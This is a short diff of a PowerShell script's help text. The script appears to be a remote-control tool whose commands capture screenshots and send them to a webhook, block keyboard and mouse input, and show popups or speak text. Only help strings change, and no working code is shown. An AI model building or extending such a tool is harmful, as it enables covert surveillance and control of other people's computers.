@@ -102,9 +102,9 @@ function hlp {
         "ss"      = "capture a screenshot and send it to the webhook."
         "block"   = "block keyboard and mouse input for a duration (default 5s)"
         "unblock" = "manually unblock keyboard and mouse input"
-        "popup"   = "open a popup message box with custom text"
-        "tts"     = "speak a custom text message out loud"
-        "hlp"     = "Display this help information"
+        "popup"   = "open a message popup"
+        "tts"     = "just text to speech twin"
+        "hlp"     = "js shows all the commands"
     }
     Write-Host "Remote Library Commands:`n"
     foreach ($k in $commands.Keys) {
